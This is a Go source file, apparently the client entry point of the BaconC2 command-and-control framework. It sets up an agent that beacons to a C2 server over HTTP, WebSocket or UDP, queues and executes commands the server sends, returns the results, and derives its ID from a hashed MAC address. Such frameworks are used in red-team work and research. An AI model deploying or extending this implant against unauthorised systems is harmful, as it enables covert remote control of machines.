package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
	"github.com/google/uuid"
)

var (
	defaultServerURL      = "http://localhost:8081"
	defaultBeaconInterval = 10 * time.Second
	defaultProtocol       = "http"
	defaultUDPHost        = "127.0.0.1"
	defaultUDPPort        = 9000
)

func main() {
	logging.SetLevel(logging.LevelDebug)

	serverURL := flag.String("server", defaultServerURL, "C2 server URL (e.g. http://127.0.0.1:8081)")
	beaconInt := flag.Int("interval", int(defaultBeaconInterval.Seconds()), "Beacon interval in seconds")
	protocol := flag.String("protocol", defaultProtocol, "Communication protocol (http/ws)")
	udpHost := flag.String("udphost", defaultUDPHost, "UDP server host")
	udpPort := flag.Int("udpport", defaultUDPPort, "UDP server port")
	flag.Parse()

	cfg := &config.AgentConfig{
		AgentID:        generateAgentID(),
		ServerURL:      *serverURL,
		BeaconInterval: time.Duration(*beaconInt) * time.Second,
		Protocol:       *protocol,
		UDPServerHost:  *udpHost,
		UDPServerPort:  *udpPort,
	}

	cmdQueue := queue.NewMemoryQueue[models.Command]()
	resultQueue := queue.NewMemoryQueue[models.CommandResult]()

	encoderChain := encoders.NewChainEncoder([]encoders.Encoder{encoders.DummyEncoder{}})

	transportProtocol := transport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)

	commandRegistry := command_handler.GetGlobalCommandRegistry()
	commandRegistry.RegisterHandler(command_handler.CommandHandler{
		Name:    "return_results",
		Handler: transportProtocol.SendResults,
	})

	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg, commandRegistry)
	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)

	if err := client.Initialize(); err != nil {
		logging.Error("Failed to initialize agent: %v", err)
		os.Exit(1)
	}

	go commandExecutor.ProcessCommandQueue()

	if err := client.Start(); err != nil {
		logging.Error("Failed to start agent: %v", err)
		os.Exit(1)
	}

	logging.Info("Agent client started successfully")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	client.Stop()
	logging.Info("Agent client stopped")
}

func generateAgentID() string {
	platform := runtime.GOOS

	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			mac := iface.HardwareAddr
			if len(mac) == 0 {
				continue
			}
			sum := sha256.Sum256(mac)
			hashedMAC := hex.EncodeToString(sum[:8])
			return fmt.Sprintf("%s-%s", platform, hashedMAC)
		}
	}

	return fmt.Sprintf("%s-%s", platform, uuid.New().String())
}
